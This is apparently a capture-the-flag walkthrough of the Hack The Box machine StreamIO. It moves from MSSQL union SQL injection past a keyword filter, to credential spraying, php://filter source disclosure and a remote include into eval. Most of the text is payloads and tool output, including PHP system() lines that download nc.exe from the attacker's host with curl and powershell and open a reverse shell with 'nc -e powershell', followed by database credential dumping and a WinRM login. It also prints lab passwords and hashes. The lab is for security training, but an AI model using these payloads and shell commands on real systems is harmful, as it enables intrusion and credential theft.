# Recon & Enum

### Rustscan & Nmap
```bash
awk -F: '{print $2}' rustscan.txt | paste -sd ","

nmap -p 53,80,88,135,139,389,445,443,464,593,636,3268,3269,5985,9389,49667,49678,49677,49708,54187 -sC -sV $IP
```

### Directory Brute Force
not working without `-k`
```bash
Could not connect to https://streamio.htb due to SSL errors (run with -k to ignore)

feroxbuster -u https://streamio.htb -k
feroxbuster -u https://streamio.htb/admin/ -k -x php

301      GET        2l       10w      150c https://streamio.htb/Admin => https://streamio.htb/Admin/
200      GET        2l        6w       58c https://streamio.htb/admin/master.php
```

# Shell as yoshihide
### SQL injection
* https://watch.streamio.htb/search.php

```sql
Using `null` or `order` will be blocked * https://sandunigfdo.medium.com/sql-injection-union-attack-finding-a-column-containing-text-179949e100b2
Malicious Activity detected!! Session Blocked for 5 minutes 
' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3,4,5,6 fRoM information_schema.schemata--

abcd' union select 1,2,3,4,5,6-- 
abcd' union select 'a',1,2,3,4,5--
abcd' union select 1,'a',2,3,4,5--
abcd' union select 1,@@version,3,4,5,6;-- 

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23 Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows Server 2019 Standard 10.0 (Build 17763: ) (Hypervisor) 

abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- 

master
model
msdb
STREAMIO  <- 10' union select 1,(select DB_NAME()),3,4,5,6--
streamio_backup
tempdb
```

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-list-databases
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-union-based
* https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

```sql
abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- 
abcd' union select 1,name,3,4,5,6 from STREAMIO..sysobjects WHERE xtype = 'U';-- 
abcd' union select 1,STRING_AGG(name, ', '),3,4,5,6 from STREAMIO..sysobjects WHERE xtype = 'U';-- 

movies
users

abcd' union select 1,name,3,4,5,6 from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');-- 

username
password

abcd' union select 1, concat(username,':',password) ,3,4,5,6 from users--

Got the crackedpass.txt
```

### Brute force the web
* https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#check-passwords

```bash
cat crackedpass.txt | cut -d: -f1 > user
cat crackedpass.txt | cut -d: -f3 > pass
cat crackedpass.txt | cut -d: -f1,3 > userpass

crackmapexec smb $IP -u user -p pass --no-bruteforce --continue-on-success
SMB         10.129.63.50    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) 
SMB         10.129.63.50    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
```

I’ll use the `https-post-form` plugin, which takes a string formatted as `[page to post to]:[post body]:F=[string that indicates failed login]`. It finds one that works:

```bash
hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
# Both works fine
hydra -L user -P pass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
```

### Fuzz web admin parameters
Both wfuzz and ffuf works fine

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=5b81mitco4j6hgiljr9euhqj1c -fs 1678

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 245ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 256ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 244ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 244ms]
```

* https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-cookies
* https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz

```bash
Fuzzing Custom headers
wfuzz -u 'https://streamio.htb/admin/?FUZZ=' -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -H "Cookie: PHPSESSID=5b81mitco4j6hgiljr9euhqj1c" --hh 1678

Fuzzing Cookies
wfuzz -u 'https://streamio.htb/admin/?FUZZ=' -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -b "PHPSESSID=5b81mitco4j6hgiljr9euhqj1c" --hh 1678
```

### Using the debug param
`https://streamio.htb/admin/?debug=index.php` -> this option is for developers only ---- ERROR ----
`https://streamio.htb/admin/?debug=master.php` working

### PHP filter
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter

* php://filter/convert.base64-encode|convert.base64-decode/resource=master.php
* php://filter/convert.base64-encode/resource=master.php

```bash
echo "onlyPGg<SNIP>9DQo/Pg==" | base64 -d > master.php <- Beautified
```

```php
<?php
if (isset($_GET["debug"])) {
    echo "this option is for developers only";
    if ($_GET["debug"] === "index.php") {
        die(" ---- ERROR ----");
    } else {
        include $_GET["debug"]; <- Use it to do RFI
    }
} elseif (isset($_GET["user"])) {
    require "user_inc.php";
} elseif (isset($_GET["staff"])) {
    require "staff_inc.php";
} elseif (isset($_GET["movie"])) {
    require "movie_inc.php";
}
?>
```

### RCEish
The `Content-Type: application/x-www-form-urlencoded` not been added by Firefox by default. By Burp do it automatically.

##### Other 3 things
1. 

```bash burp
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=5b81mitco4j6hgiljr9euhqj1c
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

include=http://10.10.16.12/cmd.php <- you can't do a ?cmd=.. here. Since it's not really RCE but to feed the `eval`
``` 

2. To feed the `eval` you can't use `<?php ?>` tag anymore but plain php code. And the server side might have cache you need to keep chaning the file name to gain more stablitiy. `cmd.php` -> `cmd02.php`

3. The popular shell doesn't work
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.63.50] 60254
'uname' is not recognized as an internal or external command,
operable program or batch file.
```

### Explolit
 Only `curl` and `powershell -c` worked after checking the version
```php
system("curl --version");
system("wget --version");
system("powershell --version");
system("powershell Get-Host");

system("powershell -c wget http://10.10.16.12/nc.exe -outfile c:\\windows\\temp\\nc.exe")
system("curl 10.10.16.12/nc64.exe -o c:\\windows\\temp\\nc64.exe");

system("c:\windows\\temp\\nc.exe 10.10.16.12 443 -e powershell");
```

```cmd
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.63.50] 51820
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
whoami
streamio\yoshihide
```

# Shell as nikk37
### Enum
```cmd
PS C:\inetpub\watch.streamio.htb> type search.php
type search.php
<?php
$search = strtolower($_POST['q']);

// sqlmap choker
$shitwords = ["/WAITFOR/i", "/vkBQ/i", "/CHARINDEX/i", "/ALL/i", "/SQUARE/i", "/ORDER/i", "/IF/i","/DELAY/i", "/NULL/i", "/UNICODE/i","/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "ifnull/i", "/ or /i"];
foreach ($shitwords as $shitword) {
        if (preg_match( $shitword, $search )) {
                header("Location: https://watch.streamio.htb/blocked.php");
                die("blocked");
        }
}


# Query section
$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');

dir -recurse *.php | select-string -pattern "database"

admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

##### streamio_backup DB
```cmd
PS C:\inetpub\streamio.htb> where.exe sqlcmd
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
PS C:\inetpub\streamio.htb> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM streamio_backup..sysobjects WHERE xtype = "U"'
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM streamio_backup..sysobjects WHERE xtype = "U"'
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           
// Alternatively
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

Get data
```cmd
PS C:\inetpub\streamio.htb\admin> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users;'
```

```txt
nikk37 get_dem_girls2@yahoo.com
Lauren ##123a8j8w5123##
Sabrina !!sabrina$
```

```cmd
PS C:\inetpub\streamio.htb\admin> net user nikk37
net user nikk37
User name                    nikk37
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:57:16 AM
Password expires             Never
Password changeable          2/23/2022 1:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2022 2:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
```

```bash
# crackmapexec smb 10.10.11.158 -u user -p pass --continue-on-success --no-bruteforce
crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
SMB         watch.streamIO.htb 5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        watch.streamIO.htb 5985   DC               [*] http://watch.streamIO.htb:5985/wsman
WINRM       watch.streamIO.htb 5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```